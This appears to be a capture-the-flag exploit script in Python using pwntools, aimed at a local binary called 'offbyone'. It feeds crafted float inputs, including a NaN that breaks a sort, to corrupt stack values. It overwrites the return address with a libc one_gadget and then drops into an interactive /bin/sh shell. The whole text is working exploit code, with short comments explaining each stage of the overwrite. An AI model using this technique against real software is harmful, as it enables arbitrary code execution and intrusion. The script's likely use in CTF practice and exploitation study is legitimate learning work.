from pwn import *

io = process("./offbyone")

N = 10000

cur = 0x29d90 # where main originally returns
target = 0xebc81 # one_gadget address
'''
0xebc81 execve("/bin/sh", r10, [rbp-0x70])
constraints:
  address rbp-0x78 is writable
  [r10] == NULL || r10 == NULL || r10 is a valid argv
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp
'''
diff1 = (target & 0xffff) - (cur & 0xffff)
diff2 = (target >> 16) - (cur >> 16)

inp = [
	N*2+100, N*2+100, # does nothing besides influence sorting order
	float('nan'),     # mess up sorting
	10,               # last element after sorting is 10 (number of bins)
	0, 0              # first element after sorting is 0
]
for i in range(128):
	inp.append(16 + 2*(N-2) + 1) # increment nan exponent to get it out of nan range
for i in range(0x80):
	inp.append(16 + N*2 + 8) # make rbp-0x78 writeable
for i in range(diff1):
	inp.append(16 + N*2 + 20) # one_gadget lower bytes
for i in range(diff2):
	inp.append(16 + N*2 + 21) # one_gadget upper bytes
for i in range(17):
	inp.append(16 + N*2 + 12) # change vuln return addr to "add rsp, 0x8; ret" gadget

inp += [1] * (N - len(inp)) # pad to 10000 floats

for f in inp:
    io.sendline(str(f).encode())

io.interactive()
